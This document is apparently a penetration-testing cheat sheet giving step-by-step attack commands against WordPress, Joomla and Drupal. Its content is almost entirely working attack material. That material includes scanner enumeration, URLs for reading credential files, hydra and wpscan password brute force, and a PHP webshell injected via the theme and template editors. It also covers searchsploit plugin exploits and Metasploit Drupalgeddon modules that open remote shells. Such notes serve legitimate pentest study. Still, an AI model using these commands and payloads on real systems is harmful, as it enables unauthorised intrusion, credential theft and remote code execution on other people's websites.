# 🗂️ CMS Exploitation

---

## 📖 Description

Content Management Systems (CMS) like WordPress, Joomla, and Drupal power a large portion of the web. Because they are widely deployed and often poorly maintained, they are common targets during web penetration tests. The attack surface includes outdated core versions, vulnerable plugins or extensions, weak credentials, and exposed admin panels.

The general approach for any CMS follows the same pattern: **enumerate → find credentials or a vulnerability → reach the admin panel → achieve RCE**.

---

## 1️⃣ WordPress

WordPress is the most widely used CMS in the world, which also makes it the most frequently attacked. Its plugin ecosystem is the main source of vulnerabilities.

### Enumeration

```bash
wpscan --url http://TARGET --enumerate u,p,t --plugins-detection aggressive
```

### Files to review

```
http://TARGET/readme.html              → exact version
http://TARGET/robots.txt               → hidden paths
http://TARGET/wp-config.php            → database credentials
http://TARGET/wp-json/wp/v2/users      → user enumeration
http://TARGET/xmlrpc.php               → alternative brute force endpoint
```

### Login panels

```
http://TARGET/wp-admin
http://TARGET/wp-login.php
```

### Brute force

```bash
wpscan --url http://TARGET -U admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

# If that finds nothing, escalate the wordlist
wpscan --url http://TARGET -U admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt

wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt
```

### 💥 RCE via Admin Panel

Once logged in as admin, inject a webshell through the theme editor:

```
Appearance → Theme Editor → functions.php → append at the bottom:
<?php system($_GET['cmd']); ?>
```

Execute:

```
http://TARGET/wp-content/themes/THEME_NAME/functions.php?cmd=id
```

### 💥 RCE via Vulnerable Plugin

```bash
# Find the exploit
searchsploit plugin_name version

# View exploit details
searchsploit -x EXPLOIT_ID

# Copy to working directory
searchsploit -m EXPLOIT_ID

# Check usage
python3 EXPLOIT_ID.py --help

# Run
python3 EXPLOIT_ID.py -u http://TARGET -p /?p=1

# Verify RCE
curl "http://TARGET/wp-content/uploads/shell.php?cmd=id"
```

---

## 2️⃣ Joomla

Joomla is another popular CMS, often found in corporate and government websites. Its admin panel is always located at `/administrator`.

### Enumeration

```bash
joomscan --url http://TARGET
joomscan --url http://TARGET --enumerate-components

# If joomscan is not available
msfconsole -q
search joomla
use auxiliary/scanner/http/joomla_version
set RHOSTS http://TARGET
run
```

### Files to review

```
http://TARGET/README.txt           → exact version
http://TARGET/robots.txt           → hidden paths
http://TARGET/configuration.php    → database credentials
```

### Login panel

```
http://TARGET/administrator/
```

### Brute force

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"

# If that finds nothing, escalate the wordlist
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"

hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
```

### 💥 RCE via Admin Panel

Once logged in as admin, inject a webshell through the template editor:

```
Extensions → Templates → select the active template → edit index.php → append:
<?php system($_GET['cmd']); ?>
```

Execute:

```
http://TARGET/templates/TEMPLATE_NAME/index.php?cmd=id
```

---

## 3️⃣ Drupal

Drupal is common in enterprise and government environments. Older versions are affected by critical unauthenticated RCE vulnerabilities known as **Drupalgeddon**.

### Enumeration

```bash
droopescan scan drupal -u http://TARGET

# If droopescan is not available
curl -s http://TARGET/CHANGELOG.txt | head -5
```

### Files to review

```
http://TARGET/CHANGELOG.txt                  → exact version
http://TARGET/robots.txt                     → hidden paths
http://TARGET/sites/default/settings.php     → database credentials
```

### Login panels

```
http://TARGET/user/login
http://TARGET/admin
```

### 💥 Drupalgeddon

First, identify which CVE applies based on the version:

```
Drupalgeddon2 (CVE-2018-7600) — unauthenticated:
  - Drupal 7.x < 7.58
  - Drupal 8.x < 8.3.9 / 8.4.6 / 8.5.1

Drupalgeddon3 (CVE-2018-7602) — requires authentication:
  - Drupal 7.x < 7.59
  - Drupal 8.x < 8.5.3
```

**Drupalgeddon 2** (no credentials needed):

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS TARGET
set LHOST YOUR_IP
run
```

**Drupalgeddon 3** (credentials required):

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon3
set RHOSTS TARGET
set LHOST YOUR_IP
set USERNAME admin
set PASSWORD password
run
```
